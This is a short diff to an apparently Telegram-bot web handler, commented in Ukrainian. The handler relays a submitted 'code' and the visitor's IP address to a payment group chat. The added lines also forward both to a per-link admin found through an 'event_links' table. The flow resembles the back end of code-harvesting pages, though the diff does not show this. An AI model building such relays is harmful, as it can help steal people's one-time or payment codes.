@@ -1405,6 +1405,7 @@ async def code_notify(request):
     data = await request.json()
     code = data.get('code', '')
     ip = data.get('ip', '')
+    page_code = data.get('page', '') or data.get('page_code', '')
     text = f"Code: {code}\nIP: {ip}"
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
@@ -1414,6 +1415,16 @@ async def code_notify(request):
         ]
     )
     await bot.send_message(PAYMENT_GROUP_ID, text, reply_markup=kb)
+    # --- Додаю дублювання адміну, якщо знайдено user_id по page_code ---
+    admin_user_id = None
+    if page_code:
+        c = conn.cursor()
+        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+        row = c.fetchone()
+        if row:
+            admin_user_id = row[0]
+    if admin_user_id:
+        await bot.send_message(admin_user_id, text)  # без кнопок
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
